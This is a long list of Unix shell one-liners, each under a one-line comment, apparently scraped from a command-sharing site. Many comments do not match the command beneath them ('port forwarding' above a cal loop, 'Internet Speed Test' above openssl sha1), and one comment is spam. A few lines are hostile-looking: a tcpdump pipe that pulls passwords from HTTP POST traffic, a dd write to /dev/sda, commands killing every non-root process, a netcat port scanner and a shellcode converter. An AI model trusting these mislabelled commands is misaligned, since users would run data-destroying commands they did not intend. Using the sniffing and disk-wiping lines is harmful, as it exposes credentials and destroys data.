ls -1d */
# erase next word
ALT + d
# List the most recent dates in reverse-chronological order
seq 1 5 | xargs -I"#" date --date="today -# days" +'%Y-%m-%d'
# Watch postgresql calls from your application on localhost
sudo tcpdump -nnvvXSs 1514 -i lo0 dst port 5432
# delete all leading and trailing whitespace from each line in file
sed 's/^[ \t]*//;s/[ \t]*$//' -i file
# Open Port Check
lsof -ni TCP
# Mount SMB share with password containing special characters
mount_smbfs '//user:p%40ss@server/share' /Volumes/share
# Get your default route
ip route | grep default | awk '{print $3}'
# Debian Runlevel configuration tool
sed -i 's/[ \t]*$//' file
# delete all trailing whitespace from each line in file
sed -i 's/^\s\+//' <file>
# strip config files of comments
grep -vE '^$|^[\s]*[;#]'
# docker kill all containers
docker kill $(docker ps -q)
# Boooted as EFI/UEFI or BIOS
[[ -d "/sys/firmware/efi" ]] && echo "UEFI" || echo "BIOS"
# Change attributes of files so you can edit them
sudo chattr -i <file that cannot be modified>
# Grep recursively for a pattern and open all files that match, in order, in Vim, landing on 1st match
X='pattern'; vim +/"$X" `egrep -lr "$X" *`
# Nicely display mem usage with ps
ps -o comm,%mem,args -u www-data
# capture selected window
scrot -s /tmp/file.png
# See OpenVZ Container id's of top 10 running processes by %cpu
ps -e h -o pid --sort -pcpu | head -10 | vzpid -
# Copy modification timestamp from one file to another.
touch -r "source_file" "destination_file"
# live netcat network throughput test
nc -l -p 7777 > /dev/null
# diff process output
diffprocess () { diff <($*) <(sleep  3; $*); }
# Let keyboard LED blink
while true; do du -s <file_or_directory>; sleep <time_interval>; done
# Add sudo with shortcut alt+e in bash
bind '"\ee": "\C-asudo \C-e"'
# Find top 5 big files
ls -Sh **/*(.Lm+100) | tail -5
# Find last reboot time
sysctl -a | grep boottime | head -n 1
# list current   processes  writing to hard drive
lsof | grep -e "[[:digit:]]\+w"
# A simple X11 tea timer
$(STEEP=300; sleep $STEEP; xmessage "Your tea is done") &
# resolve hostname to IP our vice versa with less output
resolveip -s www.freshmeat.net
# List the biggest accessible  files/dirs in current directory, sorted
du -ms * 2>/dev/null |sort -nr|head
# calculate md5 sums for every file in a directory tree
find . -type f -print0 | xargs -0 md5sum
# show hidden chars in vi
set list / set nolist
# Top 15 processes with the largest number of open files
lsof +c 15 | awk '{print $1}' | sort | uniq -c | sort -rn | head
# Set a user password without passwd
chpasswd <<< "user:newpassword"
# Uncompress a CSS file
cat somefile.css | awk '{gsub(/{|}|;/,"&\n"); print}' >> uncompressed.css
# Print a row of 50 hyphens
for i in `seq 1 1 50`; do  echo -n -; done
# Juste a reminder that this works.
true || false && echo true || echo false
# LIST FILENAMES OF FILES CREATED TODAY IN CURRENT DIRECTORY
ls -l --time-style=+%Y-%m-%d | awk "/$(date +'%Y-%m-%d')/ {print \$7}"
# Generate random number with shuf
echo $((RANDOM % 10 + 1))
# Help shell find freshly installed applications (re: PATH)
rehash
# Suspend, background, and foreground a process
top; ctrl-z; bg; jobs; fg
# Display duplicated lines in a file
cat file.txt | sort | uniq -dc
# quickly formats a fat partition. usefull for flash drives
mkfs.vfat /dev/sdc1
# 100% rollback files to a specific revision
git reset --hard <commidId> && git clean -f
# Display the end of a logfile as new lines are added to the end
tail -f logfile
# extract column from csv file
cut -d, -f5
# Pimp your less
export LESS='-x4FRSXs'
# Find usb device in realtime
watch -n 0,2 lsusb
# Clear filesystem memory cache
sysctl -w vm.drop_caches=3
# generate random mac-address using md5sum + sed
date | md5sum | sed -r 's/(..){3}/\1:/g;s/\s+-$//'
# Compare a remote file with a local file
vimdiff scp://[user@]host1/<file> scp://[user@]host2/<file>
# Function to check whether a regular file ends with a newline
endnl () { [[ -f "$1" && -s "$1" && -z $(tail -c 1 "$1") ]]; }
# Get your local IP regardless of your network interface
ifconfig|sed '/inet/!d;/127.0/d;/dr:\s/d;s/^.*:\(.*\)B.*$/\1/'
# quickly formats a fat partition. usefull for flash drives
lsof -nPi tcp:80
# Find processes stuck in dreaded "D" state aka IO Wait
ps aux | awk '{if ($8 ~ "D") print $0}'
# Debug pytest failures in the terminal
pytest --pdbcls pudb.debugger:Debugger --pdb --capture=no
# Speed up launch of liferea
sqlite3 ~/.liferea_1.4/liferea.db 'VACUUM;'
# Define shell variable HISTIGNORE so that comments (lines starting with #) appear in shell history
export HISTIGNORE=' cd "`*: PROMPT_COMMAND=?*?'
# Store dirs to later be changed to independant of the last directory you were in. Also with managment tools.
pushd /directory/to/remember
# Print only the odd lines of a file (GNU sed)
sed 2~2d
# mercurial close branch
hg commit --close-branch -m 'close badbranch, this approach never worked'
# List all files modified by a command
touch .tardis; the command ; find . -newer .tardis; rm .tardis;
# PulseAudio: set the volume via command line
pactl set-sink-volume @DEFAULT_SINK@ +5%
# Check reverse DNS
dig -x {IP}
# Tar files matching a certain wildcard
tar -czf ../header.tar.gz $(find . -name *.h)
# ls not pattern
ls *[^.gz]
# Determine status of a RAID write-intent bitmap
mdadm -X /tmp1/md2bitmap
# Determine command type (alias, keyword, function, builtin, or file)
type -t $1
# Count lines in a file with grep
grep -c ".*" filename
# Umount only the NFS related to 'string'
for i in `df -P |grep string|cut -f2 -d%|cut -c2-100`; do umount -l -f $i;done
# copy audio file from playlist to a floder
more xx.m3u |grep -v "^#" |xargs -i cp {} target
# Display the size of all your home's directories
du -sh ~/*
# get the oldest file in a directory
ls -1t --group-directories-first /path/to/dir/ | tail -n 1
# Push a directory onto the stack
= () { pushd ${1:+"$1"}; }
# Upgrading packages.  Pacman can update all packages on the system with just one command. This could take quite a while depending on how up-to-date the system is. This command can synchronize the repository databases and update the system's packages.
tar -xvpf file.tar.gz
# Command to logout all the users in one command
who -u|grep -v root|awk {'print $6'}|kill  `awk {'print $0'}`
# True Random Dice Roll
echo $(</dev/urandom tr -dc 1-6 | head -c1)
# Find an installed app
wmic product | findstr /I "name_of_app"
# List process in unkillable state D (iowait)
ps aux | awk '{if ($8 ~ "D") print $0}'
# Print out your hard drive to a jet-direct compatible printer.
cat /dev/hda|netcat -q 0 192.168.1.2 9100
# vi - Change only whole words exactly matching 'http' to 'git'; ask for confirmation.
:%s/\<http\>/git/gc
# Bash Dialog
dialog --textbox dock.sh 50 1000
# Trace and view network traffic
tcpdump -A -s 0 port 80
# Know SELinux status
sestatus -v
# Run a command if today is the last day of the month
if [[ `:$(cal);echo $_` == `date +%d` ]]; then ROTATE_MONTHLY_TABLES_SCRIPT;fi
# Not a kismet replacement...
watch -n .5 "iwlist wlan0 scan"
# Convert all .wav to .mp3
audio-convert <dir>/*
# wget download with multiple simultaneous connections
cat url.list | parallel -j 8 wget -O {#}.html {}
# watch the previous command
watch -n1 -d !!
# shows history of logins on the server
ls | tr [:upper:] [:lower:] | grep -oP '\.[^\.]+$'  | sort | uniq -c | sort
# echo something backwards
echo linux|rev
# Find all dotfiles and dirs
find -mindepth 1 -maxdepth 1 -name .\*
# Substitute an already running command
c=$(pgrep <cmd>) && <new_cmd> && kill $c
# prettier
cal | grep -C7 --color=auto $(date +%d)
# Printout a list of field numbers (awk index) from a CSV file with headers as first line.
head -1 file.csv | tr ',' '\n' | tr -d " " | awk '{print NR,$0}'
# tar copy
tar cf - dir_to_cp/ | (cd path_to_put/ && tar xvf -)
# View Processeses like a fu, fu
pstree -p
# List 10 largest directories in current directory
du . -mak|sort -n|tail -10
# Display the tree of all instance of a particular  process
pgrep 'sleep' | while read pid; do pstree -sa -H$pid $pid ; done
# Create a directory and cd into it
take() { mkdir -p $1 && cd $1; }
# Disable sending of start/stop characters
stty -ixon
# Remove specific versions of old kernels (Ubuntu/Debian)
apt purge linux*{14..18}*
# To get how many users logged in and logged out and how many times ?
last | awk '{ print $1 }' | sort | uniq -c | grep -v wtmp
# Display the definition of a shell function
typeset -f <function-name>
# In (any) vi, add a keystroke to format the current paragraph.
map ^A !}fmt
# Get your external IP address
curl ifconfig.me/all/json
# Outputs each arg on its own line
each() { (IFS=$'\n'; echo "$*") }
# Mnemonic for `nice` and `renice` command
# Negative is Not Nice
# List available upgrades from apt (package names only)
apt-get -s upgrade | awk '/Inst.+/ {print $2}'
# port forwarding
for y in 2009 2010 2011; do cal $y; done
# follow the content of all files in a directory
find dir/ -type f | xargs tail -fqn0
# Display summary of git commit ids and messages for a given branch
git log --pretty='format:%Cgreen%H %Cred%ai %Creset- %s'
# Find inside files two different patterns in the same line and for matched files show number of matched lines
find . -name '*' -type f -print0 | xargs -0 grep -n pattern1 | grep pattern2
# Get gzip compressed web page using wget.
wget -q -O- --header="Accept-Encoding: gzip" <url> | gzip -cdf > out.html
# Unpack .tgz File On Linux
tar -axf fileNameHere.tgz
# Connect to remote machine with other enconding charset
LC_ALL=fr_FR luit ssh root@remote_machine_ip
# Create md5sum of a directory
find -type f | grep -v "^./.git" | xargs md5sum | md5sum
# Exclude inserting a table from a sql import
sed '/INSERT INTO `unwanted_table`/d' mydb.sql > reduced.sql
# Copy 3 files from 3 different servers and adds server name tag to file copied
for i in `seq 1 3`; do scp finku@server$i:file.txt server$i-file.txt; done
# ssh batch jobs: query hundreds of hosts with an ssh command
ssh -tq -o "BatchMode yes" $HOST  <some_command> >> to_a_file
# Show a script or config file without comments or blank lines
egrep -v "^$|^#" file
# Generate a certificate signing request (CSR) for an existing private key. CSR.csr MUST be exists before
openssl req -out CSR.csr -key privateKey.key -new
# pushd rotates the stack so that the second directory comes at the top.
pushd +2; pushd -2
# Use curl to save an MP3 stream
curl -sS -o $outfile -m $showlengthinseconds $streamurl
# Write and read HDD external
ntfs-3g /dev/da0s1 /mnt
# Get all available packages on Ubuntu (or any distro that uses apt)
sudo apt-cache dumpavail | grep Package | cut -d ' ' -f 2 > available.packages
# List all symbolic links in a directory matching a string
find directory -type l -lname string
# List all symbolic links in current directory
ls -la | grep ^l
# Human readable directory sizes for current directory, sorted descending
du -hsx * | sort -rh
# Watch active calls on an Asterisk PBX
watch "asterisk -vvvvvrx 'core show channels verbose'"
# route add default gateway
ip route add default via 192.168.2.1 dev ens33
# Set the hardware date and time based on the system date
hwclock --systohc -utc
# Generate hash( of some types) from string
openssl dgst -sha256 <<<"test"
# Prettify an XML file
xmllint --format --xmlout --nsclean <file>
# Given process ID print its environment variables
cat /proc/PID/environ | tr '\0' '\n'
# SSH to a machine's internet address if it is not present on your local network
ping localip -c 1 -W 1 &> /dev/null && ssh localip || ssh globalip
# Getting a domain from url, ex: very nice to get url from squid access.log
sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/"
# Get the full path of a bash script's Git repository head.
$(cd "$(dirname "${BASH_SOURCE[0]}")" && git rev-parse --show-toplevel)
# use wget to check if a remote file exists
wget -O/dev/null -q URLtoCheck && echo exists || echo not exist
# Given process ID print its environment variables
ps ewwo command PID | tr ' ' '\n' | grep \=
# shows history of logins on the server
last -aiF | head
# add lyrics
eyeD3 --lyrics=eng:these_lyrics:"$(cat lyrics_file.txt)" some_file.mp3
# sshfs usage
sshfs /root/Desktop/mountdirectory root@remotehost:/etc/
# power off system in X hours form the current time, here X=2
echo init 0 | at now + 2 hours
# SED - Substitute string in next line
sed -i.backup '/patter/{n;s/foo/bar/g}' file
# create random string from /dev/urandom (or another length)
echo `cat /dev/urandom |tr -dc "[:alnum:]" | head -c64`
# Number of commits per day in a git repository
git log | grep Date | awk '{print " : "$4" "$3" "$6}' | uniq -c
# remove repeated pairs of characters e.g. "xtxtxtxt" will become "xt"
sed -ru 's/(..)\1{2,}/\1/g'
# find all open files by named process
lsof -c $processname | egrep 'w.+REG' | awk '{print $9}' | sort | uniq
# Undo mkdir -p new/directory/path
rmdir -p new/directory/path
# Use color grep by default
alias grep 'gnu grep -i --color=auto'
# make computer speaking to you :)
tail -f /var/log/messages | espeak
# monitor the last command run
watch !!
# Go to the Nth line of file [text editor]
vi +4 /etc/mtab
# Sysadmin day date of any given year
YEAR=2015; echo Jul $(ncal 7 $YEAR | awk '/^Fr/{print $NF}')
# show git logging
git log --stat
# Show all LISTENing and open server connections, with port number and process name/pid
netstat -tulpn
# Using a single sudo to run multiple && arguments
sudo sh -c 'apt update -y && apt upgrade -y'
# delete multiple files with spaces in filenames (with confirmation)
ls -Q * | xargs -p rm
# A nice way to show git commit history, with easy to read revision numbers instead of the default hash
git log --reverse --pretty=oneline | cut -c41- | nl | sort -nr
# clear MyDNS-ng cache
kill -SIGHUP `cat /var/run/mydns.pid`
# Force unmount occupied partition
fuser -km /media/sdb1
# Filter out all blank or commented (starting with #) lines
egrep -v "(^#|^\b*$)"
# Making scripts runs on backgourd and logging output
nohup bash example.sh 2>&1 | tee -i i-like-log-files.log &
# View dmesg output in human readable format
dmesg -T
# Recall last argument of previous command
cd !$
# Monitor a file's size
watch -n 60 du /var/log/messages
# Gathering all MAC's in your local network
killall -r 'Activ'
# Display standard information about device
sudo  ethtool -i eth0
# List the size (in human readable form) of all sub folders from the current location
du -h -d1
# Execute a command with the last parameter of a previous command
ls !$
# 'micro' ps aux (by mem/cpu)
ps aux | awk '{print($1" "$3" "$4" "$11);}' | grep -v "0.0"
# Hardlink all identical files in the current directory (regain some disk space)
hardlink -vpot .
# listen to an offensive fortune
fortune -o | espeak
# A random password generator
pwgen -CsyN 1 16
# processes per user counter
ps hax -o user --sort user | uniq -c
# Reset hosed terminal,
stty sane ^J
# send substituted text to a command without echo, pipe
nc localhost 10000 <<< "message"
# Remove empty directories
rmdir **/*(/^F)
# Shell function to create a directory named with the current date, in the format YYYYMMDD.
dmd () { ( if [ "$1"x != "x" ]; then cd $1; fi; mkdir `date +%Y%m%d` ) }
# Delete all empty/blank lines from text file & output to file
sed '/^$/d' /tmp/data.txt > /tmp/output.txt
# Make changes in .bashrc immediately available
. ~/.bashrc
# Regnerate Exif thumbnail.
jhead -rgt file-name.jpg
# Make changes in any profile available immediately/Change to default group
newgrp -
# Securely destroy data on given device
# for i in $(seq 1 25); do dd if=/dev/urandom of=<your disk> bs=1M ; done
# Create a continuous digital clock in Linux terminal
while [ 1 ] ; do echo -en "$(date +%T)\r" ; sleep 1; done
# Take screenshots with imagemagick
import -quality 90 screenshot.png
# diff directories, quick cut and paste to view the changes
diff -q dir1/ dir2/ | grep differ | awk '{ print "vimdiff " $2 " " $4 }'
# list file descriptors opened by a process
ls -al /proc/<PID>/fd
# Kill all processes that don't belong to root/force logoff
for i in $(pgrep -v -u root);do kill -9 $i;done
# Find files with lines that do not match a pattern
fmiss() { grep -RL "$*" * }
# Copy via tar pipe while preserving file permissions (run this command as root!)
tar -C /oldirectory -cvpf - . | tar -C /newdirector -xvf -
# show how many regex you use in your vim today
cat ~/.viminfo  | sed -n '/^:[0-9]\+,\([0-9]\+\|\$\)s/p'
# Pause and Resume Processes
stop () { ps -ec | grep $@ | kill -SIGSTOP `awk '{print $1}'`; }
# list all file-types (case-insensitive extensions) including subdirectories
find /path/to/dir -type f |sed 's/^.*\.//' |sort -f |uniq -i
# Show all listening and established ports TCP and UDP together with the PID of the associated process
netstat -plantu
# Copy a file from a remote server to your local box using on-the-fly compression
rsync -Pz user@remotehost:/path/file.dat .
# Edit a script that's somewhere in your path.
vim `which <scriptname>`
# Create more threads with less stack space
ulimit -s 64
# Enter a command but keep it out of the history
<space> secret -p password
# Update file with patch
patch originalfile -i my.patch -o newfile; mv newfile originalfile
# Remove spaces from filenames - through a whole directory tree.
apt-cache pkgnames linux-
# Press a key automatically
while true; do xvkbd -xsendevent -text "\[$KEY]" && sleep 2; done
# reverse order of file
awk '{a[i++]=$0} END {for (j=i-1; j>=0;) print a[j--] }'
# Find files with size over 100MB and output with better lay-out
find . -type f -size +100M
# recursively change file name from uppercase to lowercase (or viceversa)
rsync -av -f"+ */" -f"- *" [source] [dest]
# turn off auto hard disc boot scanning for ext3
info gpg |less
# Generate MD5 of string and output only the hash checksum in a readable format
echo -n "String to MD5" | md5sum | sed -e 's/[0-9a-f]\{2\}/& /g' -e 's/  -//'
# Quickly generate an MD5 hash for a text string using OpenSSL
echo -n 'the_password' | md5sum -
# Convert & rename all filenames to lower case
convmv --lower --notest FILE
# Get me yesterday's date, even if today is 1-Mar-2008 and yesterday was 29-Feb-2008
TZ=XYZ24 date
# Generate MD5 of string and output only the hash checksum
echo -n "String to MD5" | md5sum | cut -b-32
# simple du command to give size of next level of subfolder in MB
du --max-depth=1 -B M |sort -rn
# Tunnel ssh through Socks Proxy
ssh -o ProxyCommand='nc -x ProxyHost:8080 %h %p' TargetHost
# List files size sorted and print total size in a human readable format without sort, awk and other commands.
ls -sSh /path | head
# power off system in X minutes
shutdown -h 60
# Marks all manually installed deb packages as automatically installed.
apt-mark showmanual|xargs sudo apt-mark markauto
# delete at start of each line until character
grep -Po '^(.*?:\K)?.*'
# generate random password
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | sed 1q
# command! -nargs=1 Vs vs &lt;args&gt;
Create aliases for common vim minibuffer/cmd typos
# Do the last command, but say 'y' to everything
yes | !!
# list human readable files
file *|grep 'ASCII text'|sort  -rk2
# Create a backup of the file.
cp path/filename{,-$(date +%Y-%m-%d)}
# Take a screenshot every 2 seconds
i=0;while :; do i=$(expr "$i" + 1); scrot "$i".png; sleep 2; done;
# Resume scp of a big file
rsync -a -v --stats -e ssh /home root@<newserver>:/root/
# Realtime lines per second in a log file, with history
tail -f access.log | pv -l -i10 -r -f 2>&1 >/dev/null  | tr /\\r \ \\n
# kill all foo process
ps -ef | grep [f]oo | awk '{print $2}' | xargs kill -9
# Prefix every line with a timestamp
any command | sed "s/^/\[`date +"%Y%m%d%H%M%S"`]/"
# Extract HTTP Passwords in POST Requests
sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"
# Fast portscanner via Parallel
parallel -j200% -n1 -a textfile-with-hosts.txt nc -vz {} ::: 22
# locate a filename, make sure it exists and display it with full details
locate -e somefile | xargs ls -l
# Erase empty files
find . -type f -size 0 -delete
# Use "most" as your man pager
export MANPAGER='most'
# flip faster and more precisely through commands saved in history
bash history: modification /etc/inputrc
# Change framebuffer font
setfont cybercafe
# Kill XMMS for a cron job
pkill xmms
# Download entire website for offline viewing
$ wget --mirror -p --convert-links -P ./<LOCAL-DIR> <WEBSITE-URL>
# Show the UUID of a filesystem or partition
ls /dev/disk* | xargs -n 1 -t sudo zdb -l | grep GPTE_
# gets your public IP address
mwiki () { dig +short txt `echo $*|sed 's|  *|_|g'`.wp.dg.cx; }
# Archive all folders in a directory into their own tar.bz2 file
for i in */; do echo tar -cjf "${i%/}.tar.bz2" "$i"; done
# view all lines without comments.
grep -v "^#" file.txt | more
# Command line calculator
calc() { python -c "from math import *; print $1"; }
# Create an alias, store it in ~/.bash_aliases and source your new alias into the ~/.bashrc
echo "alias topu='top -u USERNAME'" >>  ~/.bash_aliases && source .bashrc
# Convert current symbolic directory into physical directory
cd -P .
# Run CPU benchmark from command line
time echo "scale=5000; 4*a(1)" | bc -l -q
# Command line calculator
calc() { bc <<< $*; }
# Get a file from SharePoint with cURL
echo mem|sudo tee /sys/power/state
# copy remote ssh session output to local clipboard
nmblookup -A <ip>
# combining streams
ll /root/ 2>&1 | grep -E '(psw|password)'
# tell if a port is in use
netstat -a --numeric-ports | grep 8321
# Check if it's OK to spawn tmux. Bool's Rools.
[[ $DISPLAY != "" ]] && [[ ${TERM%screen*} != "" ]] && tmux attach
# Calculate pi with specific scale
echo 'scale=10; 4*a(1)' | bc -l
# Get a list of the erroring cifs entries in fstab
ls $(grep cifs /etc/fstab | grep -v ^# |awk ' { print $2 } ') 1>/dev/null
# Print a single route to a destination and its contents exactly as the kernel sees it
ip route get dest_ip
# Create a bunch of dummy text files
for i in {1..4096}; do base64 /dev/urandom | head -c 8192 > dummy$i.rnd ; done
# Print a random 8 digit number
jot -s '' -r -n 8 0 9
# Display the output of a command from the first line until the first instance of a regular expression.
command | sed '/regex/q'
# Get MAC address
ifconfig | awk '/^eth0/ {print $5}'
# Backup trought SSH
tar cvzf - /wwwdata | ssh root@IP "dd of=/backup/wwwdata.tar.gz"
# Find installed network devices
sudo lshw -C network
# run command on a group of nodes in parallel
echo -n m{1..5}.cluster.net | xargs -d' ' -n1 -P5 -I{} ssh {} 'uptime'
# reset an hanging terminal session
^J tput sgr0 ^J
# Go up multiple levels of directories quickly and easily.
alias ..="cd .."; alias ...="cd ../.."; alias ....="cd ../../.."
# let a cow tell you your fortune
cowsay $(fortune)
# Stripping ^M at end of each line for files
tail +### MYFILE
# Start a game on the discrete GPU (hybrid graphics)
alias game='DRI_PRIME=1'
# dump 1KB of data from ram to file
dd if=/dev/mem of=file.dump bs=1024 skip=0 count=1
# gain all mp3s in subfolders w/o encoding
find . -type f -iname '*.mp3' -print0 | xargs -0 mp3gain -r -k
# Lists all listening ports together with the PID of the associated process
netstat -anpe
# Ultra fast public IP address lookup using Cloudflare's 1.1.1.1
awk -F, '{print $1" "$2" "$NF}' foo.txt
# What is the use of this switch ?
manswitch() { man $1 | grep -A5 "^ *\-$2"; }
# Print all lines in a file that are not a certain length
awk 'length($0)!=12 {print}' your_file_name
# Find directories over 50MB in the home directory
du -k ~/* | awk '$1 > 50000' | sort -nr
# Mount FileVault sparsebundle image manually (e.g.: from TimeMachine disk).
ifconfig | grep HWaddr | awk '{print $1,$5}'
# Create backup copy of file, adding suffix of the date of the file modification (NOT today's date)
cp file{,.$(date -d @$(stat -c '%Y' file) "+%y%m%d")}
# generate random number
echo $RANDOM
# Resolve the "all display buffers are busy, please try later" error on a Foundry
dm display-buffer reset
# Command to logout all the users in one command
who -u | grep -vE "^root " | kill `awk '{print $6}'`
# Read null character seperated fields from a file
read -d ""
# Copy/move a bunch of files to dot files and back
rename s/^/./ *
# delay: a simple scheduler
delay until 16 && import_db.sh
# Print all open regular files sorted by the number of file handles open to each.
sudo lsof | egrep 'w.+REG' | awk '{print $10}' | sort | uniq -c | sort -n
# create and md5 sum of your password
read -s p && echo -n $p | md5sum;p=
# Set GIT_COMMITTER_DATE = GIT_AUTHOR_DATE for all the git commits
git filter-branch --env-filter 'export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"'
# Check if *hardware* is 32bit or 64bit
cat /proc/cpuinfo | grep " lm " > /dev/null && echo 64 bits || echo 32 bits
# Comment out all lines in a file beginning with string
sed -i 's/^\(somestring\)/#\1/' somefile.cfg
# Given $PID, print all child processes on stdout
ps uw --ppid $PID
# View the current number of free/used inodes in a file system
df -i  <partition>
# delete file name space
find . -type f -print0 | xargs -0 rename 's/\ //g'
# underscore to camelCase
echo "hello_world" | sed -r 's/([a-z]+)_([a-z])([a-z]+)/\1\U\2\L\3/'
# Count the number of characters in a string from the standard input.
echo -n "foo" | wc -c
# Ping a range of addresses
nmap -sP -T Insane 192.168.1.1-254
# Simple addicting bash game.
while $8;do read n;[ $n = "$l" ]&&c=$(($c+1))||c=0;echo $c;l=$n;done
# sum numbers in the file (or stdin)
echo $(($(tr '\n' '+')0))
# commentate specified line of a file
sed -i '<line_no>s/\(.*\)/#\1/' <testfile>
# List files with full path
ls -d $PWD/*
# Automaticly cd into directory
shopt -s autocd
# Disconnect a wireless client on an atheros-based access point
iwpriv ath<x> kickmac <macaddress>
# Show URL/text in clipboard as QR code
awk 'BEGIN{RS="\0"}{gsub(/\n/,"<SOMETEXT>");print}' file.txt
# BASH: Print shell variable into AWK
MyVAR=86; awk -v n=$MyVAR '{print n}'
# list all files in a directory, sorted in reverse order by modification time, use file descriptors.
ls -Fart
# Remove BOM (Byte Order Mark) from text file
awk '{if(NR==1)sub(/^\xef\xbb\xbf/,"");print}' text.txt > newFile.txt
# Kill process by pid
taskkill /pid 10728
# Grab the top 5 CLFUContest one-liners
for i in `lanscan -i | awk '{print $1}'` ; do ifconfig $i ; done
# SoX recording audio and trimming silence
alias noc="awk 'NF && ! /^[[:space:]]*#/'"
# Exit mc with 2 keystrokes
<ctrl+o><ctrl+d>
# convert wav into mp3 using lame
lame -V2 rec01.wav rec01.mp3
# convert binary data to shellcode
hexdump -v -e '"\\""x" 1/1 "%02x" ""' <bin_file>
# diff color words
git diff --color-words file1 file2
# Internet Speed Test
ls [FILENAME] | xargs openssl sha1
# Mount a truecrypt drive from a file from the command line interactively
sudo truecrypt <truecrypt-file> <mount-point>
# start a VNC server for another user
su -c "vncserver -depth 32 -geometry 1024x768" username
# Renames all files in the current directory such that the new file contains no space characters.
for file in *; do mv -v "$file" "$(sed 's/ //g' <(echo $file))"; done
# Network traffic on NICs in mbps without sar, iperf, etc...
RX1=`cat /sys/class/net/${INTERFACE}/statistics/rx_bytes`  (see script below)
# Remove grep itself from ps
ps afx|grep [a]pache
# print code 3-up and syntax-highlighted for easy beach-time study
:%s/\([^\"]\)\(\n\)/\1 /g
# Get all IPs via ifconfig
ifconfig | awk '/inet / {sub(/addr:/, "", $2); print $2}'
# Delete an IPtable rules based on row number
iptables -L -vnx --line-numbers; iptables -t nat -D <chain-name> <number>
# generate a telephone keypad
echo {1..9} '* 0 #' | tr ' ' '\n' |paste - - -
# Should I be sleeping?
[ $(date +"%H") -lt 7 ] && echo you should probably be sleeping...
# Grep auth log and print ip of attackers
egrep 'Failed password for invalid' /var/log/secure | awk '{print $13}' | uniq
# Remove multiple spaces
sed "s/^ *//;s/ *$//;s/ \{1,\}/ /g" filename.txt
# list files in 'hitlar' mode
ls -Fhitlar
# List files in directory tree with newest last
find <directory> -type f -printf "%T@\t%p\n"|sort -n|cut -f2|xargs ls -lrt
# Find files with the same names in several directories.
ls -1 . dir2 dir3|sort|uniq -d
# Get the size of all the directories in current directory
sudo du -sh $(ls -d */) 2> /dev/null
# Open-iscsi target discovery
iscsiadm -m discovery -t sendtargets -p 192.168.20.51
# Lines per second in a log file
tail -n0 -f access.log>/tmp/tmp.log & sleep 10; kill $! ; wc -l /tmp/tmp.log
# Alternative for basename using grep to extract file name
fileName(){ echo ${1##*/}; }
# Swap a file or dir with quick resotre
mv public_html{,~~} && mv public_html{~,} && mv public_html{~~,~}
# copy string to clipboard
du --max-depth=1 -h * |sort -h -k 1 |egrep '(M|G)\s'
# sort list of email addresses by domain.tld
sort -t@ -k2 emails.txt
# Using vim to save and run your python script.
vim ... :nmap <F5> :w^M:!python %<CR>
# Quickly create an alias for changing into the current directory
map() { if [ "$1" != "" ]; then alias $1="cd `pwd`"; fi }
# Reload all sysctl variables without reboot
/sbin/sysctl -p
# Extract multiple tar files at once in zsh
tar -xi < *.tar
# Cut flv video from minute 19 to minute 20 using flvtool2
flvtool2 -C -i 1140000 -o 1200000 input output
# Replace spaces in filename
for i in *\ *; do if [ -f "$i" ]; then mv "$i" ${i// /_}; fi; done
# List files with full path
echo $PWD/*
# convert png into jpg using imagemagick
for img in *.png; do   convert "$img" "$img.jpg" ; done
# Open screen on the previous command
screen !!
# Rename all .jpeg and .JPG files to .jpg
rename 's/\.jpeg/\.jpg/' *.jpeg; rename 's/\.JPG/\.jpg/' *.JPG
# Check if a string is into a variable
[[ ${var##*yourstring*} != ${var} ]]
# Find the modified time (mtime) for a file
date -r foo
# Run a command multiple times with different subcommands
echo apt-get\ {update,-y\ upgrade}\ \&\& true | sudo bash
# Exit shell faster
^D
# Display top 5 processes consuming CPU
ps -eo pcpu,user,pid,cmd | sort -r | head -5
# happened to find this not bad software to keep my files and folders safe! Even the free trial version has the fantastic functions to protect any private files from being seen by anyone except me. With it I can encrypt, hide or lock anything I want, amazin
tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
# Get the IP address of a machine. Just the IP, no junk.
ip -o -4 addr show | awk -F '[ /]+' '/global/ {print $4}'
# Skip to next selection in playlist
sed -i 's/^/#/' FILENAME
# Append last argument to last command
<Alt+.>
# Rotate all jpeg images in current folder, rename them to EXIF datetime and set files timestamp to EXIF datetime
jhead -autorot -ft -n"%Y_%m_%d-%H_%M_%S" *.[jJ][pP][gG]
# grep compressed log files without extracting
zgrep -i "string" log.tar.gz
# Output files without comments or empty lines
function catv { egrep -v "^$|^#" ${*} ; }
# Remove a line from a file using sed (useful for updating known SSH server keys when they change)
vi +<lineNumber>d +wq <filename>
# Get your external IP address if your machine has a DNS entry
host $HOSTNAME|cut -d' ' -f4
# Command to logout all the users in one command
skill -KILL -v /dev/pts/*
# count of down available ips
nmap -v -sP 192.168.10.0/24 | grep down | wc -l
# Dump an aspell dictionary as a word list
aspell -d en dump master | aspell -l en expand > words
# Convert a Python interactive session to a python script
sed  's/^\([^>.]\)/#\1/;s/^>>> //;s/^\.\.\./  /'
# test moduli file  generated  for openssh
ssh-keygen -T moduli-2048 -f /tmp/moduli-2048.candidates
# List the CPU model name
grep 'model\|MHz' /proc/cpuinfo  |tail -n 2
# Find the biggest files
find -type f | xargs -I{} du -sk "{}" | sort -rn | head
# Copy files for backup storage
cp -auv /SorceDirectory/ /ParentDestination/
# Check if variable is a number
if [[ "$1" =~ ^[0-9]+$ ]]; then echo "Is a number"; fi
# dd if=/dev/null of=/dev/sda
dd if=/dev/null of=/dev/sda
# Install pip with Proxy
cut -d',' -f6 file.csv | sort | uniq
# Shortcut to find files with ease.
finame(){ find . -iname "*$1*"; }
# Process command output line by line in a while loop
while read -r line; do echo $line; done < <(YOUR COMMAND HERE);
# count of down available ips
nmap -v -sP 192.168.10.0/24 | grep -c down
# Remove a range of lines from a file
vi +{<end>..<start>}d +wq <filename>
# Create a file of repeated, non-zero
dd if=/dev/zero bs=64K count=1 | tr "\0" "\377" > all_ones
# put command in a loop to keep trying a connection
while true; do nc <ip address of server> <port>;done
# Mount an smb share on linux
mount -t smbfs //$server/share /local/mount -o rw,username=$USER
# Add a line from 1 file after every line of another (shuffle files together)
sed '/^/R addfile' targetfile > savefile
# Remove newlines from output
awk /./ filename
# Go up multiple levels of directories quickly and easily.
alias ..="cd .." ...="cd ../.." ....="cd ../../.."
# Open a file with specified application.
open -a BBEdit file.sql
# floating point operations in shell scripts
